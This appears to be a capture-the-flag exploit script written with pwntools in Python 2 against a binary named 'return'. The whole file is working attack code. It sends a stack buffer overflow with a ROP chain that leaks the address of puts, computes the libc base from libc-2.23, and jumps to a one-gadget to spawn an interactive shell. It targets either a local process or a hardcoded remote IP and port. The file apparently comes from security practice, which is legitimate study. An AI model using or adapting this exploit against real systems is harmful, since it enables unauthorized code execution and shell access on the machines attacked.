from pwn import * 
import sys

b = ELF("./return")
l = ELF("./libc-2.23.so")

prr = 0x0000000000400783# : pop rdi ; ret
prrr= 0x0000000000400781# : pop rsi ; pop r15 ; ret

if (len(sys.argv) == 1):
	p = process("./return")
else:
	p = remote("13.209.121.90", 13787)

payload = "a"*(0x20+8)
payload += p64(prr)
payload += p64(b.got['puts'])
payload += p64(b.symbols['puts'])
payload += p64(b.symbols['main'])

p.recvuntil("??")
p.sendline(payload)
p.recvuntil("!!\n")
leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
libc = leak - l.symbols['puts']
log.info("puts = 0x%x" % leak)
log.info("libc = 0x%x" % libc)

oneshot = libc + 0xf1147
payload = "a"*(0x20+8)
payload += p64(oneshot)
print p.recv()
p.sendline(payload)

p.interactive()
